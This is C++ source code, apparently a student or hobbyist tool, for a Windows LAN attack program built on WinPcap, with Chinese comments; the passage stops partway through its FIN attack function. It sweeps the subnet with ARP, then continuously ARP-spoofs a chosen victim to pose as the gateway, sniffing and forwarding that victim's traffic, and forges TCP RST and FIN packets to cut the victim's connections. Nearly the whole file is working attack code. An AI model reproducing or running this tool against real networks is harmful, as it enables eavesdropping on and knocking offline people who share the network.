#include "pcap.h"
#include <thread>
#include <atomic>
#include <mutex>
#include <condition_variable>

#include <conio.h>
#include <stdio.h>
#include <iostream>
#include <chrono>
#include <vector>
#include <windows.h>

#include <Packet32.h>
#include <ntddndis.h>
#include "Iphlpapi.h"
#pragma comment(lib, "IpHlpApi.lib")

using std::cout;
using std::endl;

// 0x0806是arp协议
#define		ETH_P_ALL	0x0003
#define		ETH_P_IP	0x0800
#define		_WINSOCK_DEPRECATED_NO_WARNINGS		// 解决冲突

struct C_EthHead
{
	u_char	DstMac[6];
	u_char	SrcMac[6];
	u_short	Proto;
};
struct C_IP4Head
{
	u_char	VerAndHeadlen;		// 1字节	4位版本号(4)+4位首部长度(一般20)
	u_char	tos;				// 1字节	tos服务类型(被忽略)
	u_short PacketLength;		// 2字节	整个包的长度
	u_short identification;		// 2字节	16位标识符(分片和重组使用)
	u_short	TagAndOffset;		// 2字节	3位标志+13位片偏移(分片和重组使用)
	u_char	TTL;				// 1字节	生存周期
	u_char	proto;				// 1字节	协议类型  1 2 6 17,分别是ICMP IGMP TCP UDP
	u_short CheckSum;			// 2字节	校验和
	IN_ADDR SrcIP;				// 4字节	源IP
	IN_ADDR DstIP;				// 4字节	目的IP
};
struct C_TCPHead
{
	u_short	SrcPort;			// 2字节	源端口
	u_short	DstPort;			// 2字节	目的端口
	u_int	SeqNumber;			// 4字节	发送的序号
	u_int	AckNumber;			// 4字节	期望收到的对方的下一个序号
	u_char	HeadLength;			// 1字节	前4位表示首部长度，后四位被保留
	u_char	tag;				// 1字节	前两位被保留，后六位分别用于 URG ACK PSH RST SYN FIN
	u_short	WindowSize;			// 2字节	
	u_short CheckSum;			// 2字节	检验和，覆盖TCP首部和数据，由系统强制填写
	u_short UrgPtr;				// 2字节	紧急指针
};
struct C_UDPHead
{
	u_short	SrcPort;			// 2字节	源端口
	u_short	DstPort;			// 2字节	目的端口
	u_short	PacketLen;			// 2字节	包括首部和数据在内的长度
	u_short	CheckSum;			// 2字节	校验和
};
struct C_ARPPacket
{
	u_short	HardwareType;		// 2字节	硬件类型，为1表示以太网地址
	u_short ProtoType;			// 2字节	协议类型，为0x0800表示IP
	u_char	HardwareLen;		// 1字节	硬件地址长度，一般为6
	u_char	ProtoLen;			// 1字节	协议地址长度，一般为14
	u_short	OperType;			// 2字节	操作类型，1为ARP请求，2为ARP应答，3、4为RARP的请求和应答
	u_char	SrcMacAndIP[10];	// 10字节	源mac和ip			// 这里把mac和IP合在一起的原因是,mac有6字节，紧随其后定义IN_ADDR的IP结构，会导致mac的6字节对齐到8字节
	u_char	DstMacAndIP[10];	// 10字节	目标mac和ip
};

int					choose;						// 分支处选择输入
char				errbuf[PCAP_ERRBUF_SIZE];	// 错误信息存储
int					DevPacketCount[256]{ -1 };	// 短时间内对收到的包计数
std::atomic<int>	EXIT = 0;					// 控制所有线程退出的标记
std::atomic<int>	STOP = 0;					// 用来控制操作的停止，arp欺骗线程和arp欺骗后抓包的线程，用这个来控制停止
std::atomic<int>	PacketCount = 0;			// 统计接收到的包数量，每打印一个包计数+1
std::mutex					mtx;				// 用来线程同步
std::condition_variable		cond;				// 用来线程同步

pcap_if_t*			alldevs, * d;				// 前者用来存储所有网络设备的信息，后者用来遍历
int					DevCount = 0;				// 统计网络设备的个数
pcap_t*				PcapHandle[256];			// pcap打开某个网卡后取得的句柄(网卡句柄集合)
int					DevNumber;					// 存储所选择的网卡号			
unsigned char		MAC[6];						// 存储网卡号对应的MAC
IN_ADDR				LocalDevIp;					// 存储网卡号对应的IP
IN_ADDR				NetIp;						// 当前网段的 网络地址
IN_ADDR				DefaultGateWayIp;			// 当前网段的 默认网关   在网络地址上+1
u_char				DefaultGateWayMac[6];		// 默认网关的 mac
IN_ADDR				BroadIp;					// 当前网段的 广播地址
IN_ADDR				MaskIp;						// 当前网段的 子网掩码
IN_ADDR				ByAttackerIP;				// 被监听者IP
u_char				ByAttackerMAC[6];			// 被监听者MAC

std::vector<std::pair<ULONG*, u_char*>>	LiveDev;	// 局域网当前存活设备的IP和MAC

pcap_pkthdr*	pkd;			// 用于接收数据包的结构
const u_char*	RecvBuf{};		// 用于接收数据包的结构
int				res;			// 收包的返回值

time_t			local_tv_sec;	// 用于打印时间戳
struct			tm* ltime;		// 用于打印时间戳
char			timestr[16];	// 用于打印时间戳

u_char			IPheadlen;		// IP包头长度		一定要无符号才能计算对
u_int			TCPheadlen;		// TCP包头长度
u_int			UDPheadlen;		// 包头长度

C_EthHead*		EthHead;		// 以太网头指针
C_IP4Head*		Ip4Head;		// IP4头指针
C_TCPHead*		TcpHead;		// TCP头指针
C_UDPHead*		UdpHead;		// UDP头指针
int				PrintfCount = 0;// 打印包时的计数
int				RecvCount = 0;	// 收到包时的计数


void InputThread();				// 控制输入线程

int ChooseDev();										// 获取当前设备的所有网卡，并为每个网卡启动一个 测试接收线程，以选择使用哪个网卡
void ChooseDevOutPutThread(pcap_if_t* dev, int id);		// 测试接收线程

void GetNetInfo();				// 获取所选网卡的mac，以及当前网络的子网掩码、IP、网关、等

void LocalNetDiscover();		// 局域网设备发现（收）线程，收到回复就保存打印
void LocalNetDevDetectThread();	// 局域网设备发现（发）线程，对网段内每个IP发送一个ARP请求

void MainMenu();				// 主菜单函数，循环选择执行什么操作

void ShadowListen();			// 对被监听者的包转发+打印
void SustainCheatThread();		// 持续对被监听者发送arp欺骗

void RstDisNet();				// rst攻击，同样调用SustainCheatThread来进行arp欺骗抓包
void FinDisNet();				// fin攻击

unsigned int IPStrToInt(const char* ip);					// IP字符串转化为整数
short IpCheckSum(short* ip_head_buffer, int ip_hdr_len);	// IP的校验和函数
SHORT Tcpchecksum(USHORT* buffer, int size);				// TCP的校验和包含包头和数据

int main()
{	
	std::thread t(InputThread);		// 创建一条线程用来接受输入
	t.detach();
	ChooseDev();					// 遍历网卡，选择一块网卡作为欺骗者
	GetNetInfo();					// 获取本地mac和IP存储到全局LocalDevIp和MAC
	LocalNetDiscover();				// 对网段内每个IP发送一个ARP请求,收到回复就算存活，并打印
	MainMenu();
	printf("输入任意字符结束程序。\n");
	for (auto it = LiveDev.begin(); it < LiveDev.end(); ++it)	// 清理空间
	{
		delete it->first;
		delete [] it->second;
	}
	pcap_freealldevs(alldevs);									// 释放结构
	getchar();
	return 0;
}

void InputThread()
{
	printf("输入线程已启动。\n\n");
	char cmd[1024];
	while (!EXIT)
	{
		scanf("%s", cmd);
		if (strcmp(cmd, "choose") == 0)
		{
			scanf("%d", &choose);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "stop") == 0)
		{
			STOP = 1;
		}
		else if (strcmp(cmd, "gateway") == 0)
		{
			scanf("%s", cmd);
			DefaultGateWayIp.S_un.S_addr = IPStrToInt(cmd);
			DefaultGateWayIp.S_un.S_addr = htonl(DefaultGateWayIp.S_un.S_addr);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if(strcmp(cmd,"byattacker") == 0)
		{
			scanf("%s", cmd);
			ByAttackerIP.S_un.S_addr = IPStrToInt(cmd);
			ByAttackerIP.S_un.S_addr = htonl(ByAttackerIP.S_un.S_addr);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "dev") == 0)
		{
			scanf("%d", &DevNumber);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "jump") == 0)
		{
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "exit") == 0)
			EXIT = 1;
		else
			printf("未定义输入。\n\n");
	}
	printf("输入线程已结束。\n\n");
}

int ChooseDev()
{
	if (pcap_findalldevs(&alldevs, errbuf) == -1)			// 取得所有的网络设备
	{
		fprintf(stderr, "Error inpcap_findalldevs: %s\n", errbuf);
		return 0;
	}

	for (d = alldevs; d; d = d->next)						// 打印所有的网络设备
	{
		printf("%d. %s", DevCount++, d->name);
		if (d->description)  printf(" (%s)\n", d->description);
		else  printf(" (Nodescription available)\n");
	}
	printf("\n");

	d = alldevs;											// 为每个网卡设备启动一个收包测试线程，以从中选择网卡
	for (int i = 0; i < DevCount && d; ++i, d = d->next)
	{
		PcapHandle[i] = pcap_open_live(d->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, nullptr);		
		if (d)
		{
			if (PcapHandle[i] == nullptr)
			{
				printf("设备%d.<%s>打开失败，该设备被跳过。\n", d->name, i);
				continue;
			}
		}
		else
		{
			printf("试图打开的设备指针为空，该设备被跳过。\n");
			continue;
		}

		std::thread t(ChooseDevOutPutThread, d, i);
		t.detach();

		printf("设备 <%s> 打开成功。网络测试线程已分离。\n", d->name);
	}

	printf("\n3秒后结束测试。\n\n");
	std::this_thread::sleep_for(std::chrono::milliseconds(3000));
	EXIT = 1;
	std::this_thread::sleep_for(std::chrono::milliseconds(2000));
	EXIT = 0;
	int MaxPacket = -1;
	d = alldevs;
	printf("\n各个网卡收包数量：\n");
	for (int i = 0; i < 256 && d; ++i, d = d->next)
	{
		if (DevPacketCount[i] > 0)
		{
			printf("\tDevPacketCount[%d]:%d\t(%s)\n", i, DevPacketCount[i], d->description);
			if (MaxPacket < DevPacketCount[i])
			{
				MaxPacket = DevPacketCount[i];
				DevNumber = i;
			}
		}
	}
	printf("\n输入选择网卡，或者跳过选择收包最多的网卡（当前为：%d号网卡。）\n输入格式:( dev <空格> number) or (jump ):", DevNumber);
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
}
void ChooseDevOutPutThread(pcap_if_t* dev, int id)
{
	std::this_thread::sleep_for(std::chrono::milliseconds(1200));

	while (!EXIT)
	{
		++DevPacketCount[id];
		res = pcap_next_ex(PcapHandle[id], &pkd, &RecvBuf);
		EthHead = (C_EthHead*)RecvBuf;
		Ip4Head = (C_IP4Head*)(RecvBuf + 14);
		if (res == 0)	// 超时
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex出错\n");
			EXIT = 1;
		}
	}

	printf("网络测试线程已结束。设备名<%s>。\n", dev->description);
}

void GetNetInfo()
{
	d = alldevs;
	pcap_addr_t* a;
	for (int i = 0; i < 256 && d; ++i, d = d->next)		// 
	{
		if(i == DevNumber)
		{
			for (a = d->addresses; a; a = a->next)
			{
				switch (((sockaddr_in*)a->addr)->sin_family)
				{
					case AF_INET:
						if (a->addr)
						{
							DWORD dwLen;
							dwLen = 6;
							strncpy((char*)&LocalDevIp, (const char *)&((sockaddr_in*)a->addr)->sin_addr, sizeof(LocalDevIp));
							strncpy((char*)&MaskIp, (const char*)&((sockaddr_in*)a->netmask)->sin_addr, sizeof(MaskIp));
							BroadIp.S_un.S_addr = LocalDevIp.S_un.S_addr | (~MaskIp.S_un.S_addr);
							NetIp.S_un.S_addr = LocalDevIp.S_un.S_addr & MaskIp.S_un.S_addr;
							DefaultGateWayIp.S_un.S_addr = NetIp.S_un.S_addr + 0x01000000;
							if (SendARP(*(IPAddr*)&LocalDevIp, 0, (PULONG)&MAC, &dwLen) != NO_ERROR)
							{
								printf("Error: GetMac::sendarp\n");
								exit(0);
							}
							printf("\n 地址已取得：\n");
							printf("\t本机IP：\t%s\n", inet_ntoa(LocalDevIp));
							printf("\t网络地址：\t%s\n", inet_ntoa(NetIp)); 
							printf("\t默认网关：\t%s\n", inet_ntoa(DefaultGateWayIp));
							printf("\t广播地址：\t%s\n", inet_ntoa(BroadIp));
							printf("\t子网掩码：\t%s\n", inet_ntoa(MaskIp));
							printf("\tMAC地址：\t%02X-%02X-%02X-00-00-00\n", MAC[0], MAC[1], MAC[2]);
						}
						break;
					default:
						//cout << "网络协议族未知.";
						break;
				}
			}
			break;
		}
	}
}

void LocalNetDiscover()
{
	printf("\n开始局域网存活发现...\n\n");

	const u_char*	RecvBuf{};			// 用于接收数据包的结构
	int				res;

	C_ARPPacket*	ArpP;				

	std::vector<ULONG>	DeWeight;		// 去除重复的探测回复 

	u_char* PucharTemp;					// 存储网卡IP和MAC用到的指针	
	ULONG*	PulongTemp;					// 存储网卡IP和MAC用到的指针	

	
	std::thread t(LocalNetDevDetectThread);		// 开启另一个线程发送探测包
	t.detach();

	// 当前线程则收包打印
	// 最多等待7秒来接受arp回复包
	auto timeout = std::chrono::steady_clock::now() + std::chrono::seconds(7);
	while (std::chrono::steady_clock::now() < timeout && !EXIT)
	{
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);
		EthHead = (C_EthHead*)RecvBuf;
		ArpP = (C_ARPPacket*)(RecvBuf + 14);
		if (res == 0)	// 超时
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex出错2,收包结束\n\n");
			break;
		}
		if (ntohs(EthHead->Proto) != 0x0806)		// 只收取为0x0806的ARP包
			continue;
		if (ntohs(ArpP->OperType) != 2)				// 不是回复包就忽略
			continue;
		if (strncmp((char *)ArpP->SrcMacAndIP + 6, (char*)&LocalDevIp, 4) == 0)		// 本机发出的ARP回复包被忽略
			continue;
		if (std::find(DeWeight.begin(), DeWeight.end(), (*(ULONG*)(ArpP->SrcMacAndIP + 6))) != DeWeight.end())	// 去除重复的探测
			continue;
		DeWeight.push_back(*(ULONG*)(ArpP->SrcMacAndIP + 6));
		PucharTemp = new u_char[6];					// 这两个指针在main函数最后释放
		PulongTemp = new ULONG;						// 这两个指针在main函数最后释放
		strncpy((char *)PucharTemp, (char *)ArpP->SrcMacAndIP, 6);
		strncpy((char *)PulongTemp, (char *)(ArpP->SrcMacAndIP + 6), 4);
		LiveDev.push_back(std::make_pair<ULONG*, u_char*>((ULONG *)PulongTemp, (u_char *)PucharTemp));
		if (strncmp((char*)&(DefaultGateWayIp.S_un.S_addr), (char*)(ArpP->SrcMacAndIP + 6), 4) == 0)		// 如果是网关的IP，存下Mac
		{
			strncpy((char*)DefaultGateWayMac, (char*)ArpP->SrcMacAndIP, 6);
		}
	}

	printf("局域网存活发现完毕。\n\n");
	std::this_thread::sleep_for(std::chrono::milliseconds(1000));
}
void LocalNetDevDetectThread()
{
	std::this_thread::sleep_for(std::chrono::milliseconds(2000));

	// 先构造一个ARP包
	u_char* ArpPacket = new u_char[sizeof(C_EthHead) + sizeof(C_ARPPacket)];
	EthHead = (C_EthHead*)ArpPacket;
	C_ARPPacket* AH = (C_ARPPacket*)(ArpPacket + sizeof(C_EthHead));

	// 填写以太网帧头
	memset(EthHead->DstMac, UCHAR_MAX, 6);						// 以太网目的地址全1来广播
	strncpy((char*)EthHead->SrcMac, (const char*)&MAC, 6);		// 源地址填写事先填好的MAC
	EthHead->Proto = htons(0x0806);								// 0x0806是arp协议

	// 填写ARP包
	AH->HardwareType = htons(1);
	AH->ProtoType = htons(0x0800);
	AH->HardwareLen = 6;
	AH->ProtoLen = 4;
	AH->OperType = htons(1);
	strncpy((char*)AH->SrcMacAndIP, (const char*)MAC, 6);				// 填写源MAC
	strncpy(((char*)AH->SrcMacAndIP) + 6, (const char*)&LocalDevIp, 4);	// 填写源IP
	memset((char*)AH->DstMacAndIP, 0, 6);
	// 目的IP放在循环里填
	// strncpy(((char*)&AH->DstMacAndIP) + 6, (const char*)&ip.S_un.S_addr, 4);

	auto StartTime = std::chrono::steady_clock::now();
	for (auto it = NetIp.S_un.S_addr; it < BroadIp.S_un.S_addr; it += 0x01000000)
	{
		strncpy(((char*)AH->DstMacAndIP) + 6, (const char*)&it, 4);
		if (pcap_sendpacket(PcapHandle[DevNumber], ArpPacket, sizeof(C_EthHead) + sizeof(C_ARPPacket) /* size */) != 0)
		{
			printf("目的IP：<%s>的arp探测包发送失败XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n");
			continue;
		}
		//printf("目的IP：<%s>的arp探测包发送成功\n", inet_ntoa(*(IN_ADDR*)&it));
	}
	printf("所有ARP探测包在<%d>毫秒内发送完毕。\n\n", (std::chrono::steady_clock::now() - StartTime).count() / 1000000);

	// 释放空间
	delete[] ArpPacket;
}

void MainMenu()
{
	while (!EXIT)
	{
		system("cls");
		printf("\n");
		for (auto it = LiveDev.begin(); it < LiveDev.end(); ++it)
		{
			printf("存活机器IP：<%s>\tMAC：<%02x-%02x-%02x-00-00-00>\n\n", inet_ntoa(*(IN_ADDR*)(it->first)), it->second[0], it->second[1], it->second[2]);
		}
		printf("\n\n");
		printf("\t\t\t\t\t1.重新探测局域网\n\n");
		printf("\t\t\t\t\t2.ARP欺骗抓包\n\n");
		printf("\t\t\t\t\t3.RST断网\n\n");
		printf("\t\t\t\t\t4.FIN断网\n\n");;
		printf("\t\t\t\t\t8.退出\n\n");
		printf("输入格式:( choose <空格> number ):");
		std::unique_lock<std::mutex> lk(mtx);
		cond.wait(lk);
		lk.unlock();
		printf("\n");
		STOP = 0;
		switch (choose)
		{
		case 1:
			LiveDev.clear();
			LocalNetDiscover(); break;

		case 2:
			ShadowListen(); break;

		case 3:
			RstDisNet(); break;

		case 4:
			FinDisNet(); break;

		case 8:
			printf("aaa 退出\n");
			EXIT = 1; break;

		default:
			printf("该选择不存在!\n");
			std::this_thread::sleep_for(std::chrono::seconds(1)); break;
		}
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

void ShadowListen()
{
	printf("输入监听对象IP.\n输入格式:( byattacker <空格> IP ):");
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
	printf("\n输入网关IP，或者跳过使用默认网关。（当前为：<%s>）\n输入格式:( gateway <空格> ip) or (jump ):", inet_ntoa(DefaultGateWayIp));
	cond.wait(lk);
	lk.unlock();
	
	std::thread t(SustainCheatThread);		// 一条线程周期性发送arp欺骗包
	t.detach();

	printf("\n开始抓包...\n\n");			// 当前线程收包+转发+打印
	while (!STOP)
	{
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);			// 抓取目标数据包
		++RecvCount;
		EthHead = (C_EthHead*)RecvBuf;										// 以太网包头指针置位		
		if (strncmp((char*)EthHead->SrcMac, (char*)ByAttackerMAC, 6) != 0)
			continue;
		pcap_sendpacket(PcapHandle[DevNumber], RecvBuf, pkd->caplen);		// 源MAC是被监听者的MAC就转发
		if (res == 0)								// 超时
			continue;
		if (ntohs(EthHead->Proto) != ETH_P_IP)		// 只处理IP4包
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex出错\n\n");
			continue;
		}

		Ip4Head = (C_IP4Head*)(RecvBuf + 14);		// IP4包头置位

		IPheadlen = Ip4Head->VerAndHeadlen << 4;	// 计算IP包头长度
		IPheadlen = IPheadlen >> 4;
		IPheadlen *= 4;

		if (IPheadlen < 20 || IPheadlen > 60)		// 处理包头长度部分。
		{
			printf("包头长度不正确，跳过。值为：%d\n\n", IPheadlen);
			continue;
		}

		local_tv_sec = pkd->ts.tv_sec;				// 处理整个帧的时间
		ltime = localtime(&local_tv_sec);
		strftime(timestr, sizeof(timestr), "%H:%M:%S", ltime);
		printf("No %6d: TIME:<%s> \t", ++PrintfCount, timestr);	
		
		switch (Ip4Head->proto)						// 处理协议字段		1 2 6 17,分别是ICMP IGMP TCP UDP
		{
			case 6:
				TcpHead = (C_TCPHead*)(RecvBuf + 14 + IPheadlen);
				printf("TCP  源:<%s:%d> \t", inet_ntoa(Ip4Head->SrcIP), TcpHead->SrcPort);		// 因为inet_ntoa函数同时使用会导致问题
				printf("目的: <%s:%d>\n", inet_ntoa(Ip4Head->DstIP), TcpHead->DstPort);			// 所以分开打印
				printf("\t\t\t\t发送的序号：<%u>\t确认的序号<%u>\n\n", ntohl( ntohl(TcpHead->SeqNumber)), ntohl(ntohl(TcpHead->AckNumber)));
				break;

			case 17:
				UdpHead = (C_UDPHead*)(RecvBuf + 14 + IPheadlen);
				printf("UDP  源:<%s:%d> \t", inet_ntoa(Ip4Head->SrcIP), UdpHead->SrcPort);
				printf("目的: <%s:%d>\n\n", inet_ntoa(Ip4Head->DstIP), UdpHead->DstPort);
				break;

			case 1:
				//printf("<%s>:一个ICMP包被忽略\n\n", LocalAddrBuf);
				break;

			case 2:
				//printf("<%s>:一个IGMP包被忽略\n\n", LocalAddrBuf);
				break;

			default:
				//printf("<%s>:收到一个未解析包，协议类型：%d\n\n", LocalAddrBuf, IPhead->proto);
				break;
		}
	}
	printf("抓包已结束。\n\n");
}
void SustainCheatThread()
{
	u_char* ArpPacket = new u_char[sizeof(C_EthHead) + sizeof(C_ARPPacket)];	// 先构造一个ARP包
	EthHead = (C_EthHead*)ArpPacket;
	C_ARPPacket* AH = (C_ARPPacket*)(ArpPacket + sizeof(C_EthHead));

	for (auto it = LiveDev.begin(); it < LiveDev.end(); ++it)			// 填写以太网帧头
	{
		if (strncmp((char*)&ByAttackerIP.S_un.S_addr, (char*)(it->first), 4) == 0)
		{
			strncpy((char*)EthHead->DstMac, (char*)(it->second), 6);			// 找到IP对应的mac并填写
			strncpy((char*)AH->DstMacAndIP, (char*)(it->second), 6);			// arp包的目的mac也顺便在这里填了
			strncpy((char*)ByAttackerMAC, (char*)(it->second), 6);				// 顺便取一下被攻击的mac
			break;
		}
	}
	strncpy((char*)EthHead->SrcMac, (const char*)&MAC, 6);		// 以太网源地址填写事先填好的本地MAC
	EthHead->Proto = htons(0x0806);								// 0x0806是arp协议

	AH->HardwareType = htons(1);		// 填写ARP包
	AH->ProtoType = htons(0x0800);
	AH->HardwareLen = 6;
	AH->ProtoLen = 4;
	AH->OperType = htons(2);
	strncpy((char*)AH->SrcMacAndIP, (const char*)MAC, 6);						// ARP填写源MAC
	strncpy(((char*)AH->SrcMacAndIP) + 6, (const char*)&DefaultGateWayIp, 4);	// ARP填写源IP
	strncpy(((char*)AH->DstMacAndIP) + 6, (const char*)&ByAttackerIP.S_un.S_addr, 4);

	printf("arp欺骗线程已启动。\n\n");
	while (!STOP)
	{
		if (pcap_sendpacket(PcapHandle[DevNumber], ArpPacket, sizeof(C_EthHead) + sizeof(C_ARPPacket)) != 0)
		{
			printf("arp欺骗包发送失败XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n");
			continue;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(500));
	}

	delete[] ArpPacket;		// 释放空间

	printf("ARP欺骗线程已结束。\n\n");
}

void RstDisNet()
{
	printf("输入RstDisNet对象IP.\n输入格式:( byattacker <空格> IP ):");
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
	printf("\n输入网关IP，或者跳过使用默认网关。（当前为：<%s>）\n输入格式:( gateway <空格> ip) or (jump ):", inet_ntoa(DefaultGateWayIp));
	cond.wait(lk);
	lk.unlock();

	std::thread t(SustainCheatThread);		// 一条线程周期性发送arp欺骗包
	t.detach();

	u_char* RstPacket = new u_char[sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4];

	while (!STOP)			// 接下来就是收包,然后构造RST包
	{
		memset(RstPacket, 0 , sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4);
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);			// 抓取目标数据包
		++RecvCount;
		EthHead = (C_EthHead*)RecvBuf;										// 以太网包头指针置位		
		if (strncmp((char*)EthHead->SrcMac, (char*)ByAttackerMAC, 6) != 0)
			continue;
		pcap_sendpacket(PcapHandle[DevNumber], RecvBuf, pkd->caplen);		// 源MAC是被监听者的MAC就转发
		if (res == 0)								// 超时
			continue;
		if (ntohs(EthHead->Proto) != ETH_P_IP)		// 只处理IP4包
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex出错\n\n");
			continue;
		}

		Ip4Head = (C_IP4Head*)(RecvBuf + 14);		// IP4包头置位

		IPheadlen = Ip4Head->VerAndHeadlen << 4;	// 计算IP包头长度
		IPheadlen = IPheadlen >> 4;
		IPheadlen *= 4;

		if (IPheadlen < 20 || IPheadlen > 60)		// 处理包头长度部分。
		{
			printf("包头长度不正确，跳过。值为：%d\n\n", IPheadlen);
			continue;
		}

		if(Ip4Head->proto == 6)						// 只处理为6的TCP报
		{
			TcpHead = (C_TCPHead*)(RecvBuf + 14 + IPheadlen);
			
			C_EthHead* TempEth = (C_EthHead*)RstPacket;
			C_IP4Head* TempIp4 = (C_IP4Head*)(RstPacket + 14);
			C_TCPHead* TempTcp = (C_TCPHead*)(RstPacket + 14 + sizeof(C_IP4Head));

			// 虚假的以太网帧头，源MAC和目的MAC交换，类型字段复制
			strncpy((char*)TempEth->SrcMac, (char*)EthHead->DstMac, 6);
			strncpy((char*)TempEth->DstMac, (char*)EthHead->SrcMac, 6);
			strncpy((char*)&(TempEth->Proto), (char*)&(EthHead->Proto), 2);

			// 虚假的IP4头， 版本号首部长度、tos略过、整个包长、标识符略过、分片略过、TTL=255、proto复制、校验和略过、源IP目标IP交换
			strncpy((char*)&(TempIp4->VerAndHeadlen), (char*)&(Ip4Head->VerAndHeadlen), 1);
			TempIp4->VerAndHeadlen >>= 4;
			TempIp4->VerAndHeadlen <<= 4;
			TempIp4->VerAndHeadlen += 5;
			TempIp4->PacketLength = sizeof(C_IP4Head) + sizeof(C_TCPHead);
			TempIp4->PacketLength = htonl(TempIp4->PacketLength);
			TempIp4->TTL = 255;
			strncpy((char*)&(TempIp4->proto), (char*)&(Ip4Head->proto), 1);
			strncpy((char*)&(TempIp4->SrcIP.S_un.S_addr), (char*)&(Ip4Head->DstIP.S_un.S_addr), 4);
			strncpy((char*)&(TempIp4->DstIP.S_un.S_addr), (char*)&(Ip4Head->SrcIP.S_un.S_addr), 4);
			TempIp4->CheckSum = IpCheckSum((short*)TempIp4, 20);

			// 虚假的TCP头， 源端口目的端口交换、发送的序号是被攻击者的ack-1+4、期望收到的序号是被攻击者发出序号+1、长度字段、rst | ack标志置位、windowsize 0、其余忽略
			strncpy((char*)&(TempTcp->SrcPort), (char*)&(TcpHead->DstPort), 2);
			strncpy((char*)&(TempTcp->DstPort), (char*)&(TcpHead->SrcPort), 2);
			TempTcp->SeqNumber = TcpHead->AckNumber;
			TempTcp->SeqNumber = htonl(TempTcp->SeqNumber);
			TempTcp->AckNumber = TcpHead->SeqNumber;
			TempTcp->AckNumber = htonl(TempTcp->AckNumber);
			TempTcp->HeadLength = 5;
			TempTcp->HeadLength <<= 4;
			TempTcp->tag = 0;
			TempTcp->tag |= 1 << 2;
			//TempTcp->tag |= 1 << 4;
			TempTcp->WindowSize = htons(0);
			TempTcp->CheckSum = Tcpchecksum((USHORT*)TempTcp, 20);
			pcap_sendpacket(PcapHandle[DevNumber], (u_char*)RstPacket, sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead));
			//printf("已发送！\n");
		}
	}

	delete[] RstPacket;
}
void FinDisNet()
{
	printf("输入RstDisNet对象IP.\n输入格式:( byattacker <空格> IP ):");
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
	printf("\n输入网关IP，或者跳过使用默认网关。（当前为：<%s>）\n输入格式:( gateway <空格> ip) or (jump ):", inet_ntoa(DefaultGateWayIp));
	cond.wait(lk);
	lk.unlock();

	std::thread t(SustainCheatThread);		// 一条线程周期性发送arp欺骗包
	t.detach();

	u_char* RstPacket = new u_char[sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4];

	while (!STOP)			// 接下来就是收包,然后构造FIN包
	{
		memset(RstPacket, 0, sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4);
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);			// 抓取目标数据包
		++RecvCount;
		EthHead = (C_EthHead*)RecvBuf;										// 以太网包头指针置位		
		if (strncmp((char*)EthHead->SrcMac, (char*)ByAttackerMAC, 6) != 0)
			continue;
		pcap_sendpacket(PcapHandle[DevNumber], RecvBuf, pkd->caplen);		// 源MAC是被监听者的MAC就转发
		if (res == 0)								// 超时
			continue;
		if (ntohs(EthHead->Proto) != ETH_P_IP)		// 只处理IP4包
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex出错\n\n");
			continue;
		}

		Ip4Head = (C_IP4Head*)(RecvBuf + 14);		// IP4包头置位

		IPheadlen = Ip4Head->VerAndHeadlen << 4;	// 计算IP包头长度
		IPheadlen = IPheadlen >> 4;
		IPheadlen *= 4;

		if (IPheadlen < 20 || IPheadlen > 60)		// 处理包头长度部分。
		{
			printf("包头长度不正确，跳过。值为：%d\n\n", IPheadlen);
			continue;
		}

		if (Ip4Head->proto == 6)					// 只处理为6的TCP报
		{
			TcpHead = (C_TCPHead*)(RecvBuf + 14 + IPheadlen);

			C_EthHead* TempEth = (C_EthHead*)RstPacket;
			C_IP4Head* TempIp4 = (C_IP4Head*)(RstPacket + 14);
			C_TCPHead* TempTcp = (C_TCPHead*)(RstPacket + 14 + sizeof(C_IP4Head));

			// 虚假的以太网帧头，源MAC和目的MAC交换，类型字段复制
			strncpy((char*)TempEth->SrcMac, (char*)EthHead->DstMac, 6);
			strncpy((char*)TempEth->DstMac, (char*)EthHead->SrcMac, 6);
			strncpy((char*)&(TempEth->Proto), (char*)&(EthHead->Proto), 2);

			// 虚假的IP4头， 版本号首部长度、tos略过、整个包长、标识符略过、分片略过、TTL=255、proto复制、校验和略过、源IP目标IP交换
			strncpy((char*)&(TempIp4->VerAndHeadlen), (char*)&(Ip4Head->VerAndHeadlen), 1);
			TempIp4->VerAndHeadlen >>= 4;
			TempIp4->VerAndHeadlen <<= 4;
			TempIp4->VerAndHeadlen += 5;
			TempIp4->PacketLength = sizeof(C_IP4Head) + sizeof(C_TCPHead);
			TempIp4->PacketLength = htonl(TempIp4->PacketLength);
			TempIp4->TTL = 255;
			strncpy((char*)&(TempIp4->proto), (char*)&(Ip4Head->proto), 1);
			strncpy((char*)&(TempIp4->SrcIP.S_un.S_addr), (char*)&(Ip4Head->DstIP.S_un.S_addr), 4);
